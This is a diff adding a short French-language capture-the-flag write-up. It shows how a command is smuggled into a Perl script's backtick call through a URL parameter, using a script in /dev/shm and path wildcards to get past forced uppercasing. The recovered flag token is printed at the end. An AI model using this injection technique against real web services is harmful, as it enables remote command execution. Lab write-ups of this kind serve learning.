@@ -1,0 +1,23 @@
+un cat du script perl nous revele qu'il utilise des ` pour executer un script shell
+la regex nous dis que tout va etre mis en majuscule et tout va etre effacé apres un espace/
+on ne peut donc pas directement mettre la commande en valeur de x car elle va etre upcase et linux
+est case-sensitive.
+
+mais nous pouvons creer une file avec un nom majuscule et mettre la commande a l'interieir
+
+touch /dev/shm/TEST (un dossier ou il y a les droits)
+#!/bin/sh
+getflag > /tmp/exploit
+
+On donne ensuite les droits a notre fichier
+chmod +x /dev/shm/TEST
+
+ensuite on va sur un navigateur
+
+http://192.168.1.24:4646/?x="`/*/*/TEST`"
+on utilise des wildcards pour contourner la case sensitivity
+
+cat /tmp/exploit
+Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
+
+
